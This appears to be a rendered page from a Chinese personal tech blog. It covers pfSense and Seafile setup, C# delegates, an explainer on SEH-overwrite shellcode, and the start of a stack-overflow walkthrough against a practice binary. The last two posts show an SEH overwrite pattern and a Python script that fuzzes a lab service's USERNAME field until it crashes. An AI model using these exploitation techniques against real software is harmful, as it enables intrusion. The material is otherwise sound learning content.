+<p>可以从pfSense官网下载ISO镜像安装pfSense系统，也可以使用OVF模板。我采用OVM模板弄的，这个中文全称是<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%BC%80%E6%94%BE%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A0%BC%E5%BC%8F%E6%96%87%E4%BB%B6">开放虚拟机格式文件</a>。比起ISO还是方便很多。一路下一步就可以建立好一个pfSense虚拟机，但是不要开启。</p>
+<p><img src="/img/2017/08/vsphere/4.png"></p>
+<p>另外如果想配置好这个软路由，最好在服务器上新建一个Windows虚拟机（其实也可以是带图形的Linux，比如Ubuntu，不过我不喜欢给自己找麻烦）。建立虚拟机之前需要将ISO文件上传到服务器上，可以如下图，直接访问存储器，然后上载文件（还是上传文件这个翻译顺口一点）。</p>
+<p><img src="/img/2017/08/vsphere/22.jpg"></p>
+<p><img src="/img/2017/08/vsphere/5.png"></p>
+<p>建立虚拟机的过程比较容易，无非就是选择一下系统版本，CPU核心数，内存大小之类的，有一个小坑提一下：</p>
+<p><img src="/img/2017/08/vsphere/6.png"></p>
+<p>上图打开电源时连接，在开启虚拟机之前一定要勾上，否则会提示没有操作系统，虽然是个很蠢的坑，但是一不小心还真容易犯错，另外上图是我已经完成所有配置后的图，包括网络配置，除了标红的地方剩下的如果有什么不一样可以忽略。</p>
+<p>Ok，现在已经有了一台装好ESXi系统的服务器，并且有了两个IP地址，ESXi分配了<code>10.10.10.10</code>，而且添加了一台虚拟机，虽然目前这个虚拟机是无法上网的（除非独吞掉<code>10.10.10.11</code>这个IP地址）</p>
+<h3 id="添加网络"><a href="#添加网络" class="headerlink" title="添加网络"></a>添加网络</h3><p><img src="/img/2017/08/vsphere/33.jpg"></p>
+<p>第一部，选择添加虚拟机网络：</p>
+<p><img src="/img/2017/08/vsphere/44.jpg"></p>
+<p>然后断开所有适配器的链接</p>
+<p><img src="/img/2017/08/vsphere/7.png"></p>
+<p>改个名字，NAT Network</p>
+<p><img src="/img/2017/08/vsphere/8.png"></p>
+<h3 id="pfSense命令行配置"><a href="#pfSense命令行配置" class="headerlink" title="pfSense命令行配置"></a>pfSense命令行配置</h3><p>刚才用OVF模板建立好的pfSense虚拟机，网络适配器需要改成这样的</p>
+<p><img src="/img/2017/08/vsphere/9.png"></p>
+<p>开机的欢迎界面还是可以的</p>
+<p><img src="/img/2017/08/vsphere/10.png"></p>
+<p>虽然看到开机界面很开心，但是这个系统启动的速度其实”快“得惊人，我等了可能有十分钟才可以交互，交互界面长这样。先选择1，注册一下网络适配器。</p>
+<p><img src="/img/2017/08/vsphere/11.png"></p>
+<p>不设置VLAN</p>
+<p><img src="/img/2017/08/vsphere/12.png"></p>
+<p>然后WAN适配器输入em0，如果不放心，可以比对一下MAC地址。</p>
+<p><img src="/img/2017/08/vsphere/13.png"></p>
+<p><img src="/img/2017/08/vsphere/14.png"></p>
+<p>接着设置LAN适配器为em1</p>
+<p><img src="/img/2017/08/vsphere/15.png"></p>
+<p>再按个回车，不设置其他的了，然后按y</p>
+<p><img src="/img/2017/08/vsphere/16.png"></p>
+<p>已经回到了主菜单，等个十秒钟左右就好了，下一步设置IP地址，选择2</p>
+<p><img src="/img/2017/08/vsphere/17.png"></p>
+<p>选择1，设置WAN，我不用DHCP，所以选择n</p>
+<p><img src="/img/2017/08/vsphere/18.png"></p>
+<p>设置IP地址为<code>10.10.10.11</code></p>
+<p><img src="/img/2017/08/vsphere/19.png"></p>
+<p>子网掩码，根据情况设置，相信都懂</p>
+<p><img src="/img/2017/08/vsphere/20.png"></p>
+<p>这个是http的Web接口，选择y</p>
+<p><img src="/img/2017/08/vsphere/21.png"></p>
+<p>然后又到主菜单了，继续设置LAN，和刚才一样的配置方法。</p>
+<p><img src="/img/2017/08/vsphere/22.png"></p>
+<h3 id="pfSense-Web配置"><a href="#pfSense-Web配置" class="headerlink" title="pfSense Web配置"></a>pfSense Web配置</h3><p>经过刚才的配置，pfSense的Web管理页面已经可以访问，刚才提前建好的Windows虚拟机可以派上用场了。不过在用之前先把网络适配器改成NAT Network。</p>
+<p>将windows的本地连接ipv4地址改成<code>192.168.1.2</code>，随意，只要是这个网段下的都可以，不截图了。</p>
+<p>浏览器访问<a target="_blank" rel="noopener" href="http://192.168.1.1/">http://192.168.1.1</a> 初始用户名密码是：admin/pfsense</p>
+<p>设置WAN，我用的是Static方式，也可以是PPPOE等</p>
+<p><img src="/img/2017/08/vsphere/24.png"></p>
+<p>接下来设置LAN，稍稍看一下就好了，就是之前命令行中的，然后根据提示修改admin密码就完成了设置。</p>
+<p>现在的网络界面是这样的，关于IP地址的部分被我挡住了，因为我换掉了IP，多出一个完全不一样的IP地址可能会造成误导吧（vmk0后边的就是<code>10.10.10.10</code>）：</p>
+<p><img src="/img/2017/08/vsphere/25.png"></p>
+<p>然后，见证奇迹的时刻。</p>
+<p><img src="/img/2017/08/vsphere/26.png"></p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="http://boytnt.blog.51cto.com/966121/1292487%EF%BC%88%E6%84%9F%E8%B0%A2%E8%BF%99%E4%BD%8D%E4%BD%9C%E8%80%85%EF%BC%8C%E9%A6%96%E6%AC%A1%E9%85%8D%E7%BD%AE%E7%9A%84%E6%8C%87%E5%AF%BC%EF%BC%8C%E5%85%B3%E4%BA%8EpfSense%E9%85%8D%E7%BD%AE%E7%9A%84%E9%83%A8%E5%88%86%E5%A4%A7%E8%87%B4%E7%9B%B8%E5%90%8C%EF%BC%89">http://boytnt.blog.51cto.com/966121/1292487（感谢这位作者，首次配置的指导，关于pfSense配置的部分大致相同）</a></p>
+<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/PfSense">https://en.wikipedia.org/wiki/PfSense</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.360doc.com/content/16/1125/10/27498460_609365608.shtml%EF%BC%88%E8%99%BD%E7%84%B6%E6%B2%A1%E6%9C%89%E5%8F%82%E8%80%83%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%EF%BC%8C%E4%BD%86%E6%98%AF%E8%BF%99%E6%98%AF%E4%B8%AA%E5%8D%95%E4%B8%80IP%E5%9C%B0%E5%9D%80%E5%B0%B1%E9%85%8D%E7%BD%AE%E4%BA%86%E8%BD%AF%E8%B7%AF%E7%94%B1%E7%9A%84%E5%A4%A7%E5%93%A5%EF%BC%8C%E6%8A%98%E8%85%BE%E7%9A%84%E7%B2%BE%E7%A5%9E%E5%80%BC%E5%BE%97%E5%AD%A6%E4%B9%A0%EF%BC%8C%E5%8E%9F%E9%93%BE404%E4%BA%86%EF%BC%8C%E5%8F%AA%E5%A5%BD%E8%B4%B4%E4%B8%AA360%E7%9A%84%EF%BC%89">http://www.360doc.com/content/16/1125/10/27498460_609365608.shtml（虽然没有参考这篇文章，但是这是个单一IP地址就配置了软路由的大哥，折腾的精神值得学习，原链404了，只好贴个360的）</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/08/31/2017/Seafile_2017_08_31/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/08/31/2017/Seafile_2017_08_31/" class="post-title-link" itemprop="url">我就看看Seafile是个啥</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-08-31 15:29:20" itemprop="dateCreated datePublished" datetime="2017-08-31T15:29:20+08:00">2017-08-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2017-09-01 11:01:43" itemprop="dateModified" datetime="2017-09-01T11:01:43+08:00">2017-09-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%97%A0%E8%81%8A%E6%8A%98%E8%85%BE/" itemprop="url" rel="index"><span itemprop="name">无聊折腾</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><img src="/img/2017/08/1.png" alt="1"></p>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a target="_blank" rel="noopener" href="https://www.seafile.com/">Seafile官网</a>上的一段介绍：”Seafile 是一款开源的企业云盘，注重可靠性和性能。支持 Windows, Mac, Linux, iOS, Android 平台。支持文件同步或者直接挂载到本地访问。“</p>
+<p>seafile代码托管在<a target="_blank" rel="noopener" href="https://github.com/haiwen/seafile">github</a>上，看了一下最近的commit，貌似很神奇，一片红叉。</p>
+<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>直接搞了个Debian9 x64位系统测试，为啥要用这么新的呢，因为方便，为啥方便呢，因为内核版本是4.9，不用换内核了（我这么懒），为啥要换内核呢，因为锐速不支持ipv6，我要用bbr啊，为啥要用bbr呢？……拉倒吧，不扯犊子了。</p>
+<p>使用最熟悉的MySQL部署，跟着<a target="_blank" rel="noopener" href="http://manual-cn.seafile.com/deploy/using_mysql.html">文档</a>先把各种依赖软件安了，表示文档中这个目录设计还是很不错的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install mariadb-server</span><br><span class="line">apt-get install python2.7 python-setuptools python-imaging python-ldap python-mysqldb python-memcache python-urllib3</span><br></pre></td></tr></table></figure>
+
+<h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><p>文档中写的比较详细，所以这里就简单写一下好了。</p>
+<p>安装过程开始要填写一些信息</p>
+<p><img src="/img/2017/08/2.png" alt="2"></p>
+<p>配置好后的样子：</p>
+<p><img src="/img/2017/08/3.png" alt="3"></p>
+<p>按照官网的介绍，不过我改了一下端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./seafile.sh start # 启动 Seafile 服务</span><br><span class="line">./seahub.sh start 38000 # 启动 Seahub 网站 （运行在38000端口上）</span><br></pre></td></tr></table></figure>
+
+<h2 id="客户端是个什么感觉"><a href="#客户端是个什么感觉" class="headerlink" title="客户端是个什么感觉"></a>客户端是个什么感觉</h2><p><img src="/img/2017/08/4.png" alt="4"></p>
+<p>看起来有点网盘的样子，功能很强大。不过http是不太能够让人放心的。</p>
+<p>直接用网页访问就是这个效果（明文密码）：</p>
+<p><img src="/img/2017/08/5.png" alt="5"></p>
+<p>脱离浏览器的客户端也是一个叼样子（毕竟都是http协议，其实不用测了）：</p>
+<p><img src="/img/2017/08/6.png" alt="6"></p>
+<h2 id="安利时间"><a href="#安利时间" class="headerlink" title="安利时间"></a>安利时间</h2><p>直接默认http搭建的姿势肯定是不可取的了。不过Seafile支持用apache2或者nginx进行反向代理，采用FastCGI，对外开放https的方式。这种配置方式Seafile的中文文档做的还是很详细的。</p>
+<p><img src="/img/2017/08/7.png" alt="7"></p>
+<p>我用了一个东西比较多的服务器去搞这个事情，为了不和之前的服务冲突，这个https就不测试了。毕竟硬盘剩余空间还有2G，折腾完自己也用着不爽（2333）。</p>
+<p>不过我看到了一个很叼的图：</p>
+<p><img src="/img/2017/08/7.png" alt="8"></p>
+<p>OK，这东西还支持分布式，美滋滋。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/05/14/2017/CSharp_2017_05_14/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/05/14/2017/CSharp_2017_05_14/" class="post-title-link" itemprop="url">C# 委托和事件</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-05-14 00:00:00" itemprop="dateCreated datePublished" datetime="2017-05-14T00:00:00+08:00">2017-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2017-09-01 11:01:56" itemprop="dateModified" datetime="2017-09-01T11:01:56+08:00">2017-09-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Programing/" itemprop="url" rel="index"><span itemprop="name">Programing</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>C# 中的委托和事件是理解这门语言的一道坎，这回记一下。本文能多简略就多简略，如果被想真正学习这方面知识不小心被搜索到，请移步其他大神的博客。</p>
+<h2 id="委托"><a href="#委托" class="headerlink" title="委托"></a>委托</h2><p>并没有脱离开事件写过委托，但是委托确实是可以不和事件一起用的。委托是针对方法的一种归类方式。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public delegate void PlayDelegate(string name);</span><br><span class="line"></span><br><span class="line">private void PlayBoy(string name) &#123;</span><br><span class="line">  Console.WriteLine(&quot;Hey &quot;+ name + &quot;, play with me?&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private void PlayGirl(String name) &#123;</span><br><span class="line">  Console.WriteLine(&quot;Hey &quot;+ name + &quot;, play with me?&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public void Play(string name, PlayDelegate playMethod) &#123;</span><br><span class="line">  playMethod(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>类似于python中的函数名称作为参数传递，只不过更为标准化。</p>
+<h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p>不想搞得太复杂，直接上干货，经典的例子，烧水。</p>
+<h3 id="Heater类："><a href="#Heater类：" class="headerlink" title="Heater类："></a>Heater类：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public delegate void BoilHandler(object sender, BoilEventArgs e); </span><br><span class="line">public event BoilHandler BoilEvent;</span><br><span class="line">public class BoilEventArgs : EventArgs</span><br><span class="line">&#123;</span><br><span class="line">    public int temperature &#123; get; set; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上的代码一般是在事件发出对象的内部写。使用public暴露事件。</p>
+<h3 id="Alarm类"><a href="#Alarm类" class="headerlink" title="Alarm类"></a>Alarm类</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public void MakeAlert(object sender, EventArgs e) &#123;</span><br><span class="line">  ~~~</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="program"><a href="#program" class="headerlink" title="program"></a>program</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heater.BoilEvent += MakeAlert;</span><br></pre></td></tr></table></figure>
+
+<p>实际上如果<code>using system;</code>之后，可以用System命名空间下的EventHandler进行操作，看一下<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/system.eventhandler">MSDN</a>吧，比较详细。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>发送者做好委托和事件的设定，包装好参数，事件定义为public，外部暴露后将接收方法注册到事件上，参数与委托中定义的一致。</p>
+<p><img src="/img/2017/05/CSharp.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/04/08/2016/2016-04-08-SEH/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/04/08/2016/2016-04-08-SEH/" class="post-title-link" itemprop="url">awvs+sqlmap傻瓜注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-04-08 13:34:20" itemprop="dateCreated datePublished" datetime="2016-04-08T13:34:20+08:00">2016-04-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2017-12-29 21:01:21" itemprop="dateModified" datetime="2017-12-29T21:01:21+08:00">2017-12-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index"><span itemprop="name">二进制</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>本文将从一下几点介绍利用S.E.H写shellcode。</p>
+<ul>
+<li>S.E.H原理</li>
+<li>为什么要利用S.E.H</li>
+<li>SEH_Shellcode构造方法</li>
+<li>实际测试</li>
+</ul>
+<h2 id="0x01-S-E-H原理"><a href="#0x01-S-E-H原理" class="headerlink" title="0x01 S.E.H原理"></a>0x01 S.E.H原理</h2><blockquote>
+<p>SEH是一个结构体，这个结构体叫做异常处理结构体，每个结构体中有两个指针，第一个指针建立SEH链表，第二个指针指向异常处理函数，换句话说是异常处理函数句柄。</p>
+</blockquote>
+<h4 id="S-E-H的构造如下"><a href="#S-E-H的构造如下" class="headerlink" title="S.E.H的构造如下"></a>S.E.H的构造如下</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> --------------------------</span><br><span class="line">|DWORD: Next S.E.H recoder |	</span><br><span class="line"> --------------------------</span><br><span class="line">|DWORD: Exception handler  |</span><br><span class="line"> --------------------------</span><br></pre></td></tr></table></figure>
+
+<hr>
+<blockquote>
+</blockquote>
+<ul>
+<li>   S.E.H 按照级别可分为：线程的异常处理、进程的异常处理、系统默认的异常处理（U.E.F），其整体的处理流程为：</li>
+<li></li>
+<li>   CPU 执行时发生未捕获异常，内核结果进程的控制权，开始内核态的异常处理。<br>内核异常结束，将控制权还给 ring3.</li>
+<li>   ring3 中第一个处理异常的函数是 ntdll.dll 中的 KiUserExceptionDispatcher() 函数。</li>
+<li>   KiUserExceptionDispatcher() 首先检查程序是否处于调试状态。如果程序正在被调试，会将异常交给调试器进行处理。</li>
+<li>   在非调试状态下，KiUserExceptionDispatcher() 调用 RtlDispatchException() 函数对线程的 S.E.H 链表进行遍历，如果找到能够处理异常的回调函数，将再次遍历先前调用过的 S.E.H 句柄，即 unwind 操作，以保证异常处理机制自身的完整性。</li>
+<li>   如果栈中所有的 S.E.H 都失败了，且用户曾经使用过 SetUnhandledExceptionFilter() 函数设定进程处理异常，则这个异常处理将被调用。</li>
+<li>   如果用户自定义的进程异常处理失败，或者用户根本没有定义进程异常处理，那么系统默认的异常处理 UnhandledExceptionFilter() 将会被调用。U.E.F 会根据注册表中相关信息决定是默默地关闭程序，还是弹出错误对话框。</li>
+</ul>
+<hr>
+<p>利用S.E.H的shellcode的基本想法就是通过控制输入，利用栈溢出来覆盖S.E.H结构体，</p>
+<h2 id="0x02-为什么要利用S-E-H"><a href="#0x02-为什么要利用S-E-H" class="headerlink" title="0x02 为什么要利用S.E.H"></a>0x02 为什么要利用S.E.H</h2><p>首先，我们要明确的是本文并不能绕过数据执行保护，利用S.E.H绕过的是对于安全cookie的检测。</p>
+<h4 id="安全cookie是什么？"><a href="#安全cookie是什么？" class="headerlink" title="安全cookie是什么？"></a>安全cookie是什么？</h4><p>所谓安全cookie是在进入函数压栈的时候，在压栈之中加入一个cookie，这个cookie很有可能是个随机的值，因而无法构造，在函数执行返回的时候程序检查这个cookie的值是否正确，如果正确，说明栈没有溢出，不正确，说明发生了栈溢出。这就是利用cookie进行的栈保护。</p>
+<h4 id="那么为什么利用S-E-H可以绕过这个保护呢？"><a href="#那么为什么利用S-E-H可以绕过这个保护呢？" class="headerlink" title="那么为什么利用S.E.H可以绕过这个保护呢？"></a>那么为什么利用S.E.H可以绕过这个保护呢？</h4><p>答案很明显，当函数产生异常的时候，在函数返回之前，就触发了异常处理，而跳过了检查cookie的这一步。</p>
+<h2 id="0x03-SEH-Shellcode-构造方法"><a href="#0x03-SEH-Shellcode-构造方法" class="headerlink" title="0x03 SEH_Shellcode 构造方法"></a>0x03 SEH_Shellcode 构造方法</h2><p>既然是覆盖SEH结构体，那就要自己构造一个结构体冒充原来的S.E.H结构。</p>
+<p>经典的用法是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eb 06 90 90 (jmp 06 nop nop)</span><br><span class="line">xx xx xx xx (ppr_address)</span><br></pre></td></tr></table></figure>
+<p>ppr_address的意思是pop pop ret三个命令所在的地址。这个小插件几乎会在每一个程序中出现。</p>
+<p>看到这里的时候其实有一点我是没有弄懂的，因为之前以为Next S.E.H recoder这个变量是指针，指针就应该是地址，为什么是一句命令呢？后来我才知道这个DWORD实际上是一段命令</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/04/06/2016/2016-04-06-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/04/06/2016/2016-04-06-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">简单栈溢出</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-04-06 13:34:20" itemprop="dateCreated datePublished" datetime="2016-04-06T13:34:20+08:00">2016-04-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2017-12-29 21:00:10" itemprop="dateModified" datetime="2017-12-29T21:00:10+08:00">2017-12-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index"><span itemprop="name">二进制</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>栈溢出基本上是学习逆向的第一步，也是最简单的漏洞之一。现在的操作系统上已经很难单纯的利用栈溢出漏洞。利用pwn5.exe这个程序的栈溢出漏洞练习一下栈溢出漏洞的手动寻找与利用。</p>
+<p><a href="/extends/reverse/pwn5.exe">源程序下载</a></p>
+<ul>
+<li>  栈溢出简介</li>
+<li>  寻找溢出漏洞</li>
+<li>  漏洞利用</li>
+<li>  深度利用</li>
+</ul>
+<h4 id="栈溢出简介"><a href="#栈溢出简介" class="headerlink" title="栈溢出简介"></a><a href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E7%AE%80%E4%BB%8B" title="栈溢出简介"></a>栈溢出简介</h4><p>栈溢出是这样的一种漏洞。当程序使用了一些危险函数或者由于各种各样的原因，对用户输入的检查不严格，导致用户输入的数据本应在栈上作为数据进行存储，却被当作代码运行的一种漏洞。</p>
+<p>本文用jmp esp利用上述软件的漏洞。</p>
+<h4 id="寻找溢出漏洞"><a href="#寻找溢出漏洞" class="headerlink" title="寻找溢出漏洞"></a><a href="#%E5%AF%BB%E6%89%BE%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E" title="寻找溢出漏洞"></a>寻找溢出漏洞</h4><p>先看一下整个程序的大概情况，明确这个程序的功能。</p>
+<p>用IDA Pro打开这个程序，调用F5插件看一下main函数伪代码，很明显是一个Socket，绑定2993端口。</p>
+<p><img src="/images/2016/4-06/18-15.png"></p>
+<p>sub_4010B0这个函数很像是用户自己编写的函数，应该是用户自己编写的代码。双击这个函数进去看一下，发现了一个判断用户输入来进行响应的处理，在USERNAME这一个条件里又看到了一个IDA不认识名字的函数，进去看一下。</p>
+<p><img src="/images/2016/4-06/18-18.png"></p>
+<p>看到一个for循环，乍一看不知道是干什么，但是，一点一点仔细看下来很明显是字符串拷贝,修改变量名，这样看起来就清晰多了。</p>
+<p><img src="/images/2016/4-06/18-19.png"></p>
+<p>这个字符串拷贝很明显没有加什么保护措施，这样的代码一定是有问题的。</p>
+<p>再看一下程序给这个字符串开辟的长度是多少。</p>
+<p><img src="/images/2016/4-06/18-56.png"></p>
+<p>我们先尝试用多于512个字节的数据覆盖掉这个函数的的返回地址。看是否能成功。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line">host = &quot;172.16.189.218&quot;</span><br><span class="line">port = 2993</span><br><span class="line">tul = zio((host,port))</span><br><span class="line">tul.read_until(&#x27;*************** Welcome to take the challenge!*****************\n&#x27;)</span><br><span class="line">ch = &#x27;a&#x27;</span><br><span class="line">ss = ch</span><br><span class="line">try:</span><br><span class="line">  while True:</span><br><span class="line">      ss = ss + ch</span><br><span class="line">      tul.write(&#x27;USERNAME&#x27; + ss + &#x27;\x0d\x0a&#x27;)</span><br><span class="line">except:</span><br><span class="line">  print len(ss)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2016/4-06/20-29.png"></p>
+<p>程序崩溃了，再用OD看一下。</p>
+<p><img src="/images/2016/4-06/20-35.png"></p>
+<p>很明显可以看到esp所在的栈地址被aaaa覆盖。</p>
